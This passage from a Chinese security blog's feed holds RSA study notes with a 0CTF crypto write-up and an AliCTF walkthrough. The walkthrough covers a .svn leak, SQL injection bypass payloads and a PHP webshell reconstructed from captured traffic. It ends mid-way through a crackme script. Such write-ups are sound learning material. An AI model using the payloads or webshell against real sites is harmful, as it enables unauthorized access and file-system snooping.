    <![CDATA[<blockquote>
<p>玩了下exploit, 再来玩玩pentest。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Pentest" scheme="http://0x48.pw/tags/Pentest/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[0CTF RSA?总结 || RSA学习笔记]]></title>
    <link href="http://0x48.pw/2016/03/17/0x14/"/>
    <id>http://0x48.pw/2016/03/17/0x14/</id>
    <published>2016-03-17T01:18:02.000Z</published>
    <updated>2016-03-28T10:18:43.374Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
</blockquote>
<a id="more"></a>
<p>该题用的是中国剩余定理，顺便学了一遍RSA，发现了数学技能点的缺失</p>
<p>(PS: ^表示为次方，xor才是异或，％和mod为求余，/表示为整除)</p>
<h1 id="RSA学习笔记">RSA学习笔记</h1><p>先来学学前置技能</p>
<h2 id="前置技能">前置技能</h2><h3 id="学前符号助记">学前符号助记</h3><p>$ x = y\ (mod\ n) $         可以看成是        $ x \% n = y$<br>$ x \equiv y\ (mod\ n)$      可以看成是        $ x \% n = y \% n$</p>
<h3 id="欧拉函数">欧拉函数</h3><p>$$\phi(q) = \prod_{k=1}^∞ (1 - q^k)$$</p>
<p>然后在RSA中用到的性质： </p>
<blockquote>
<p>m是素数时，有 $\phi(m) = m - 1$</p>
<p>当m, n互质时，有 $\phi(m*n) = \phi(m) * \phi(n)$</p>
</blockquote>
<h3 id="欧拉定理">欧拉定理</h3><blockquote>
<p>设p和q互质，则 $q^{p-1} \equiv 1\ (mod\ p)$</p>
</blockquote>
<p>根据前面这说的该公式的意义为： $q^{p-1} \% p = 1 \% p$<br>所以最后可以得出：$q^{p-1} \% p = 1$</p>
<h3 id="模反元素">模反元素</h3><p>设x为q的模反元素，则x必须满足：</p>
<blockquote>
<p>$q * x \equiv 1\ (mod\ p) \Longrightarrow (q*x) \% p = 1$</p>
</blockquote>
<p>性质：</p>
<blockquote>
<p>x为q的模反元素，则$x + kp$ 都是q的模反元素(k为整数)</p>
</blockquote>
<h3 id="模逆元">模逆元</h3><p>也就是上面说的模反元素的公式：$q * x \equiv 1\ (mod\ p)$等同于$x^{-1} \equiv q\ (mod\ p)$</p>
<h3 id="中国剩余定理">中国剩余定理</h3><p>已知p, q互质<br>$n = p * q$<br>$\begin{cases}<br>c_1 \equiv x \% p\\<br>c_2 \equiv x \% q<br>\end{cases}$<br>求 $c \equiv x  \% n$</p>
<p>类似RSA?这题来举个例子：<br>已知存在三个互质数$n_1, n_2, n_3$<br>可以计算出<br>$$\begin{cases}<br>N = n_1 * n_2 * n_3\\<br>N_1 = N / n_1 = n_2 * n_3\\<br>N_2 = N / n_2 = n_1 * n_3\\<br>N_3 = N / n_3 = n_2 * n_1\\<br>d_1 = N^{-1}_1 (mod\ n_1)\\<br>d_2 = N^{-1}_2 (mod\ n_2)\\<br>d_3 = N^{-1}_3 (mod\ n_3)\\<br>\end{cases}$$</p>
<p>有存在一数x，已知<br>$$\begin{cases}<br>c_1 \equiv x \% n_1\\<br>c_2 \equiv x \% n_2\\<br>c_3 \equiv x \% n_3<br>\end{cases}$$</p>
<p>则我们可以求得：<br>$$<br>c \equiv x \% n   \Rightarrow   c \equiv (c_1N_1d_1 + c_2N_2d_2 + c_3N_3d_3) (mod\ N)<br>$$</p>
<h3 id="欧几里德算法">欧几里德算法</h3><p>公式：<br>$$gcd(a,b) = gcd(b, a\ mod\ b)$$<br>Python实现该算法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b, a%b)</span><br></pre></td></tr></table></figure></p>
<p>扩展算法：<br>扩展算法是已知a, b 求 $ax + by = gcd(a, b) = d$中的x, y<br>x和y是一个多解的集合，而扩展算法是计算其中的一个特解，而我们取的特解是在上面的欧几里德算法中最后一步：<br>$a = gcd(A, B)$<br>$b = 0$<br>这时候我们可以有特解$x = 1, y = 0$<br>$$gcd(a, b) * 1 + 0 * 0 = gcd(a, b)$$<br>那么怎么把这个算法扩展开来呢？最开始是<br>$$A_0x_0 + B_0y_0 = gcd(A, B)$$<br>在一次求余之后<br>$A_1 = B_0$<br>$B_1 = A_0 \% B_0$<br>这时候<br>$$A_1x_1 + B_1y_1 = gcd(A, B)$$<br>$$\Downarrow$$<br>$$B_0x_1 + (A_0 \% B_0)y_1 = gcd(A, B)$$<br>因为<br>$A \% B = A - (A / B) * B$<br>所以上面的式子可以转换成：<br>$$B_0x_1 + (A_0 - (A_0 / B_0)B_0)y_1 = gcd(A, B)$$<br>$$\Downarrow$$<br>$$A_0y_1 +  B_0(x_1 - (A_0 / B_0)y_1) = gcd(A, B)$$<br>和最开始的式子比较，可以得出：<br>$$<br>\begin{cases}<br>x_0 = y_1\\<br>y_0 = x_1 - (A_0 / B_0)y_1<br>\end{cases}<br>$$<br>通过上面的算法，可以写出下面的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">e_gcd2</span><span class="params">(a, b)</span>:</span></span><br><span class="line">	<span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">		x = <span class="number">1</span></span><br><span class="line">		y = <span class="number">0</span></span><br><span class="line">		<span class="keyword">return</span> (a, x, y)</span><br><span class="line">	(ans, x, y) = e_gcd2(b, a % b)</span><br><span class="line">	x, y = y, x - a / b * y</span><br><span class="line">	<span class="keyword">return</span> (ans, x, y)</span><br></pre></td></tr></table></figure></p>
<p>由于数学知识的限制，只能用递归写出。下面是wp中别人用循环的方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extended_gcd</span><span class="params">(aa, bb)</span>:</span></span><br><span class="line">    lastremainder, remainder = abs(aa), abs(bb)</span><br><span class="line">    x, lastx, y, lasty = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> remainder:</span><br><span class="line">        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)</span><br><span class="line">        x, lastx = lastx - quotient * x, x</span><br><span class="line">        y, lasty = lasty - quotient * y, y</span><br><span class="line">    <span class="keyword">return</span> lastremainder, lastx * (-<span class="number">1</span> <span class="keyword">if</span> aa &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span>), lasty * (-<span class="number">1</span> <span class="keyword">if</span> bb &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span>）</span><br></pre></td></tr></table></figure></p>
<h3 id="Other">Other</h3><p>经常看到的两个定义：</p>
<blockquote>
<p>$lcm(x, y)$     x和y的最小公倍数<br>$gcd(e, l)$      e和l的最大公约数</p>
</blockquote>
<h2 id="RSA密钥生成">RSA密钥生成</h2><p>前置技能学完了，开始研究RSA了<br>在密钥中包含了两个数据：<br>公钥：(N, e)<br>私钥：(N, d)<br>下面来看看怎么求N, e, d这三个数</p>
<ul>
<li>搞出两个超大的互质数设为p和q<blockquote>
<p>p和q互质</p>
</blockquote>
</li>
<li>p和q相乘得出密钥长度N<blockquote>
<p>$N = p * q$</p>
</blockquote>
</li>
<li>计算N的欧拉函数<blockquote>
<p>$\phi(N) = \phi(p*q) = \phi(p) * \phi(q) = (p - 1) * (q - 1)$</p>
</blockquote>
</li>
<li>然后通过随机数生成方法随机出一个e，必须满足两个条件<blockquote>
<p>$1 &lt; e &lt; \phi(N)$ 还有 e和$\phi(n)$为互质数</p>
</blockquote>
</li>
<li>再随机出一个d, 为e的模反元素<blockquote>
<p>$e * d \% \phi(N) = 1$</p>
</blockquote>
</li>
</ul>
<p>好了，三个值求出来了，现在来看看加解密<br>加解密都是对字符的二进制进行计算<br>假设明文是字符串<code>mingwen</code>则被加密的<br>$m = 0b01101101011010010110111001100111011101110110010101101110 = 30796695364658542$ </p>
<h3 id="加密">加密</h3><p>加密公式：密文$c \equiv m^e \% N$</p>
<h3 id="解密">解密</h3><p>解密公式：明文$m \equiv c^d \% N$</p>
<p>由于明文和密文的长度皆小于N，所以上面的加密解密公式可以变成：<br>$c = m^e \% N$<br>$m = c^d \% N$</p>
<h3 id="openssl简单用法小记">openssl简单用法小记</h3><p>再来用openssl来生成个公钥私钥对</p>
<h4 id="先生成私钥">先生成私钥</h4><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa <span class="attribute">-out</span> <span class="keyword">private</span><span class="built_in">.</span>pem <span class="number">1024</span></span><br><span class="line">Generating RSA <span class="keyword">private</span> key, <span class="number">1024</span> bit long modulus</span><br><span class="line"><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.</span><span class="subst">++++++</span></span><br><span class="line"><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">..</span><span class="subst">++++++</span></span><br><span class="line">e is <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br></pre></td></tr></table></figure>
<p>这里的e就是上面计算中的e，1024为上面计算中N的bits长度<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cat <span class="keyword">private</span>.pem </span><br><span class="line">-----BEGIN RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> RSA <span class="keyword">PRIVATE</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></p>
<p>这就是私钥</p>
<h4 id="再生成公钥">再生成公钥</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">private</span>.pem -pubout -out <span class="keyword">public</span>.pem</span><br><span class="line">writing RSA <span class="keyword">key</span></span><br><span class="line">$ cat <span class="keyword">public</span>.pem </span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure>
<h4 id="查看密钥信息">查看密钥信息</h4><p>查看公钥信息<br><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">public</span>.pem -pubin -<span class="keyword">text</span></span><br><span class="line"><span class="keyword">Public</span>-<span class="keyword">Key</span>: (<span class="number">1024</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    xxxxxxxxxxxxx</span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">writing RSA <span class="keyword">key</span></span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">-----<span class="keyword">END</span> <span class="keyword">PUBLIC</span> <span class="keyword">KEY</span>-----</span><br></pre></td></tr></table></figure></p>
<p>Modulus就是上面计算过程中的N，e为0x10001<br>查看私钥信息<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">private</span>.pem -text</span><br><span class="line">Private-<span class="string">Key:</span> (<span class="number">1024</span> bit)</span><br><span class="line"><span class="string">modulus:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">publicExponent:</span> <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line"><span class="string">privateExponent:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">prime1:</span></span><br><span class="line">    xxxxxxxxxxxxxx</span><br><span class="line"><span class="string">prime2:</span></span><br><span class="line">    xxxxxxxxxxxx</span><br><span class="line"><span class="string">exponent1:</span></span><br><span class="line">    xxxxxxxxxxxx</span><br><span class="line"><span class="string">exponent2:</span></span><br><span class="line">    xxxxxxxxxxx</span><br><span class="line"><span class="string">coefficient:</span></span><br><span class="line">    xxxxxxxxxx</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">xxxxxxxxxxxx</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
<p>私钥藏了所有的信息啊。。所以说如果私钥泄露了。。就GG了。。<br>$modulus = N$<br>$publicExponent = e$<br>$privateExponent = d$<br>$prime1 = p$<br>$prime2 = q$<br>$exponent1 = d \% (p-1)$<br>$exponent2 = d \% (q-1)$<br>$coefficient = q^{-1} \% p$</p>
<h1 id="RSA?">RSA?</h1><p>然后来扯0CTF的RSA?这题，首先查看公钥的信息：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsa -<span class="keyword">in</span> <span class="keyword">public</span>.pem -pubin -text</span><br><span class="line">Public-<span class="string">Key:</span> (<span class="number">314</span> bit)</span><br><span class="line"><span class="string">Modulus:</span></span><br><span class="line"><span class="label">    02:</span><span class="string">ca:</span><span class="string">a9:</span><span class="string">c0:</span><span class="number">9</span><span class="string">d:</span><span class="string">c1:</span><span class="number">06</span>:<span class="number">1</span><span class="string">e:</span><span class="number">50</span>:<span class="number">7</span><span class="string">e:</span><span class="number">5</span><span class="string">b:</span><span class="number">7</span><span class="string">f:</span><span class="number">39</span>:<span class="string">dd:</span><span class="string">e3:</span></span><br><span class="line"><span class="label">    45:</span><span class="number">5</span><span class="string">f:</span><span class="string">cf:</span><span class="string">e1:</span><span class="number">27</span>:<span class="string">a2:</span><span class="string">c6:</span><span class="number">9</span><span class="string">b:</span><span class="number">62</span>:<span class="number">1</span><span class="string">c:</span><span class="number">83</span>:<span class="string">fd:</span><span class="number">9</span><span class="string">d:</span><span class="number">3</span><span class="string">d:</span><span class="number">3</span><span class="string">e:</span></span><br><span class="line"><span class="label">    aa:</span><span class="number">3</span><span class="string">a:</span><span class="string">ac:</span><span class="number">42</span>:<span class="number">14</span>:<span class="number">7</span><span class="string">c:</span><span class="string">d7:</span><span class="number">18</span>:<span class="number">8</span><span class="string">c:</span><span class="number">53</span></span><br><span class="line"><span class="string">Exponent:</span> <span class="number">3</span> (<span class="number">0x3</span>)</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MEEwDQYJKoZIhvcNAQEBBQADMAAwLQIoAsqpwJ3BBh5Qflt<span class="regexp">/Od3jRV/</span>P4Seixpti</span><br><span class="line">HIP9nT0+qjqsQhR81xiMUwIBAw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p>
<p>从这里可以得到<br>$N = 0x2CAA9C09DC1061E507E5B7F39DDE3455FCFE127A2C69B621C83FD9D3D3EAA3AAC42147CD7188C53$<br>$e = 3$</p>
<p>然后用<a href="http://factordb.com/" target="_blank" rel="external">http://factordb.com/</a>因式分解出了三个值<br>$p = 26440615366395242196516853423447$<br>$q = 27038194053540661979045656526063$<br>$r = 32581479300404876772405716877547$</p>
<p>接下来：<br>$\phi(p*q*r) = \phi(N) = \phi(q) * \phi(p) * \phi(r) = (p-1) * (q-1) * (r-1)$<br>$\phi(N) = 2329271097867038040364127327000042742184870900536 0280557445800298810723014218767619832560713992$</p>
<p>但是这时候出问题了，上面说了e和$\phi(N)$ 要互质数，但是 $\phi(N) \% e = 0$<br>所以不能通过求d来解密密文，不过我们仍然可知<br>$$c \equiv m^3 \% N$$</p>
<p>这时候就可以用到中国剩余定理了<br>$$m^3 \equiv c \% N$$<br>$$\Downarrow$$<br>$$\begin{cases}<br>m_1^3 \equiv c \% n_1\\<br>m_2^3 \equiv c \% n_2\\<br>m_3^3 \equiv c \% n_3<br>\end{cases}$$<br>$$\Downarrow$$<br>$$m \equiv (m_1N_1d_1 + m_2N_2d_2 + m_3N_3d_3)\ mod\ N$$<br>由于m是明文，小于N，所以可以直接得出<br>$$m = (m_1N_1d_1 + m_2N_2d_2 + m_3N_3d_3)\ mod\ N$$</p>
<p>然后计算$m_1^3 \equiv c \% n1$ 可以在这个网站中进行解密<a href="http://www.wolframalpha.com/" target="_blank" rel="external">http://www.wolframalpha.com/</a></p>
<p>研究这研究了一个星期，表示心累，解密脚本看github那篇wp去吧。。撸BCTF去了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>果然不是信息安全专业的，只是自学会有很多技能点的缺失。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[This is AliCTF?]]></title>
    <link href="http://0x48.pw/2016/03/15/0x13/"/>
    <id>http://0x48.pw/2016/03/15/0x13/</id>
    <published>2016-03-15T00:35:30.000Z</published>
    <updated>2016-03-28T10:19:02.246Z</updated>
    <content type="html"><![CDATA[<p><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf0.png" alt="alictf0"></p>
<blockquote>
<p>这算是今年的阿里CTF？昨天小伙伴在玩这个，我在研究0CTF的WEB题，今早知道真相的我眼泪掉下来。上周五刚面了一轮。。。<br><a id="more"></a></p>
</blockquote>
<h1 id="Step_0">Step 0</h1><p>上图中的base64解码呗。。<br><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo <span class="string">"aHR0cDovLzIxOC4yNDQuMTQzLjE5OC8="</span> <span class="string">| base64 -d</span></span><br><span class="line">http:<span class="comment">//218.244.143.198/</span></span><br></pre></td></tr></table></figure></p>
<p>打开来是一个 伪造？ 的sqlmap网站，右键查看源码， 有一坨jsfuck，太长了，这里就不贴了。。直接丢F12里面的console运行，得到：<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">218.244</span>.143.198<span class="regexp">/.svn/</span></span><br></pre></td></tr></table></figure></p>
<p>那就svn泄露呗，记得以前做过这样的题，记不清楚了，google一下，</p>
<blockquote>
<p>现实的开发环境中，强烈建议使用导出功能svn export而不是svn co。由此可能导致非常严重的问题，很多管理员直接吧svn co出来的代码直接放到web目录下。这就使.svn隐藏文件夹被暴露于外网环境，黑客可以借助其中包含的用于版本信息追踪的“entries”文件，逐步摸清站点结构。</p>
</blockquote>
<p>所以接下来就是访问 <code>http://218.244.143.198/.svn/entries</code>, 得到<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">This is lastest <span class="keyword">version</span> SVN, <span class="keyword">U</span> know wc.<span class="keyword">db</span>?</span><br></pre></td></tr></table></figure></p>
<p>然后访问 <code>http://218.244.143.198/.svn/wc.db</code> 把这文件下下来，这文件是svn的sqlite数据库，然后装了一个这个数据库的浏览器。<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-<span class="keyword">get</span> install sqlitebrowser</span><br></pre></td></tr></table></figure></p>
<p>然后用这个打开wc.db，然后关于这个数据库的问题网上随便都搜的到，然后找到一篇wp: <a href="http://bobao.360.cn/learning/detail/129.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/129.html</a><br>发现一个页面：<code>66666/index.php</code> 不过这wp中说的源码泄露没发现，所以直接去访问看看。。</p>
<p>好了。。。这时候该问。。最短的payload的是啥？讲道理，我觉得是 <code>&#39;=&#39;</code>, 可是竟然不跟我讲道理。。。所以我觉得最短的是<code>&#39;=&#39;&#39;#</code>还有<code>&#39;||1#</code> , 然后得到<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hack <span class="keyword">it</span> <span class="built_in">to</span> make money! GoGoGo~ <span class="keyword">http</span>://<span class="number">218.244</span>.143.198/zootopia/</span><br></pre></td></tr></table></figure></p>
<p>。。这。。懵逼了一会，随便看了看默认的是啥。。。发现是一串md5: <code>d41b8265807ce33038df2b3f7aa9fb10</code><br>丢cmd5上，接出来是aliyun, 试试，(⊙v⊙)。。。。对了<br>得到一个文件:<code>c0ngrats.txt</code>, 打开来看看，得知后面还有3题，和下一题的题目地址：<code>http://218.244.143.198/static/backdoor.zip</code></p>
<h1 id="Step_1">Step 1</h1><p>下载下来解压出来是一个数据包，数据流量审计题。。关于这类的题，我觉得很蛋疼。要不然很简单，比如http这样明文传输的协议的审计，要不然再难一点，加上802.11无线协议，但是这种爆破密码就没意思了，不设密码又太简单。要不然就是很难的审计加密协议。。所以hctf的时候我就没出流量审计的题目。</p>
<p>这题呢，就属于那种就简单的把，先过滤出来http协议，然后发现第一个backdoor.php，然后整理了下这个后门的源码<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">@ini_set</span>(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line"><span class="variable">@set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">@set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line">echo(<span class="string">"-&gt;|"</span>);</span><br><span class="line"><span class="variable">$D</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">"z1"</span>]);</span><br><span class="line"><span class="variable">$F</span>=<span class="variable">@opendir</span>(<span class="variable">$D</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$F</span>==<span class="constant">NULL</span>) &#123;</span><br><span class="line">	echo(<span class="string">"ERROR:// Path Not Found Or No Permission!"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$M</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="variable">$L</span>=<span class="constant">NULL</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="variable">$N</span>=<span class="variable">@readdir</span>(<span class="variable">$F</span>)) &#123;</span><br><span class="line">		<span class="variable">$P</span>=<span class="variable">$D</span>.<span class="string">"/"</span>.<span class="variable">$N</span>;</span><br><span class="line">		<span class="variable">$T</span>=<span class="variable">@date</span>(<span class="string">"Y-m-d H:i:s"</span>,<span class="variable">@filemtime</span>(<span class="variable">$P</span>));</span><br><span class="line">		@<span class="variable">$E</span>=substr(base_convert(<span class="variable">@fileperms</span>(<span class="variable">$P</span>),<span class="number">10</span>,<span class="number">8</span>),-<span class="number">4</span>);</span><br><span class="line">		<span class="variable">$R</span>=<span class="string">"\t"</span>.<span class="variable">$T</span>.<span class="string">"\t"</span>.<span class="variable">@filesize</span>(<span class="variable">$P</span>).<span class="string">"\t"</span>.<span class="variable">$E</span>.<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">@is_dir</span>(<span class="variable">$P</span>)) <span class="variable">$M</span>.=<span class="variable">$N</span>.<span class="string">"/"</span>.<span class="variable">$R</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="variable">$L</span>.=<span class="variable">$N</span>.<span class="variable">$R</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	echo <span class="variable">$M</span>.<span class="variable">$L</span>;</span><br><span class="line">	<span class="variable">@closedir</span>(<span class="variable">$F</span>);</span><br><span class="line">&#125;;</span><br><span class="line">echo(<span class="string">"|&lt;-"</span>);</span><br><span class="line">die(); </span><br><span class="line"><span class="prompt">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>然后发现ip和该题的题目链接ip一样，去试试，没有这后门文件，那就从数据包入手。右击 -&gt; Follow TCP Stream<br>得到另一个文件<code>wllm</code>, 访问得<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">find</span> data <span class="keyword">package</span> careful, you will <span class="keyword">find</span> <span class="keyword">next</span> level url , that will be a crackme</span><br></pre></td></tr></table></figure></p>
<p>所以说下一题的入口还是在数据包里。。。看着一坨的http包，好吧，继续过滤 <code>http &amp;&amp; ip.addr==218.244.143.198</code><br>然后从第四个POST包中的参数z2中得到下一题的入口：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">"YUhSMGNEb3ZMekl4T0M0eU5EUXVNVFF6TGpFNU9DOXpkR0YwYVdNdlkzSmhZMnR0WlE9PQ=="</span> | base64 <span class="operator">-d</span>| base64 <span class="operator">-d</span></span><br><span class="line">http://<span class="number">218.244</span>.<span class="number">143.198</span>/static/crackme</span><br></pre></td></tr></table></figure></p>
<h1 id="Step_2">Step 2</h1><p>linux64位逆向题呗。。。比Z神出的简单多了，直接丢到ida中，F5，关键部分如图所示<br><img src="http://7xscw6.com1.z0.glb.clouddn.com/hexo-alictf1.png" alt="alictf1"><br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crack.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">secret = [<span class="number">0x8</span>, <span class="number">0x45</span>, <span class="number">0x0A</span>, <span class="number">0x42</span>, <span class="number">0x4b</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x2f</span>, <span class="number">0x52</span>, <span class="number">0x0b</span>, <span class="number">0x16</span>, <span class="number">0x23</span>] </span><br><span class="line">secret1 = [<span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x25</span>, <span class="number">0x72</span>, <span class="number">0x29</span>, <span class="number">0x6b</span>, <span class="number">0x73</span>, <span class="number">0x6b</span>]</span><br><span class="line"><span class="literal">result</span> = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="type">range</span>(<span class="number">12</span>):</span><br><span class="line">	tmp = secret[x] ^ secret1[x] ^ <span 